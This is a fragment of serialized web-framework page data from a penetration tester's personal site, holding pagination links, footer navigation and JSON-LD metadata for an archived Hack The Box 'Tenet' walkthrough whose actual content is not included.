+9:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing archive navigation","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-talkative-walkthrough","children":[["$","span",null,{"children":"Newer article"}],["$","strong",null,{"children":"Hack The Box: Talkative Walkthrough"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",114," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-unobtainium-walkthrough","children":[["$","span",null,{"children":"Older article"}],["$","strong",null,{"children":"Hack The Box: Unobtainium Walkthrough"}]]}]}]]}]
+a:["$","footer",null,{"className":"site-footer","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"brand-mark","aria-hidden":"true","children":"CK"}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Security Researcher and Penetration Tester"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Public profiles","children":[["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Hack The Box",{"href":"https://app.hackthebox.com/public/users/349278","target":"_blank","rel":"noreferrer","children":["Hack The Box"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credential wallet",{"href":"https://www.credential.net/profile/cyberkareem/wallet","target":"_blank","rel":"noreferrer","children":["Credential wallet"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Credly",{"href":"https://www.credly.com/users/cyberkareem/badges","target":"_blank","rel":"noreferrer","children":["Credly"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Evidence-led research · authorized assessment"}],["$","$L2",null,{"href":"/services","children":"Explore security services →"}]]}]]}]
+e:T50d,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-tenet-walkthrough/#article","headline":"Hack The Box: Tenet Walkthrough","description":"An archived walkthrough of the retired Hack The Box Tenet machine, preserved from Abdullah Kareem's OSWE Prep preparation notes.","url":"https://cyberkareem.com/writing/hackthebox-tenet-walkthrough/","datePublished":"2026-06-11T11:06:01.000Z","dateModified":"2026-07-12T00:00:00.000Z","wordCount":2515,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/12a953ec6a15f997aafcb65238957b24b05b25d4/HTB-Tenet.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/writing/covers/hackthebox-tenet-walkthrough.webp","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-tenet-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Tenet Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-tenet-walkthrough/"}]}]}b:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$e"}}]
+c:["$","$Lf",null,{"children":["$","$10",null,{"name":"Next.MetadataOutlet","children":"$@11"}]}]
+11:null
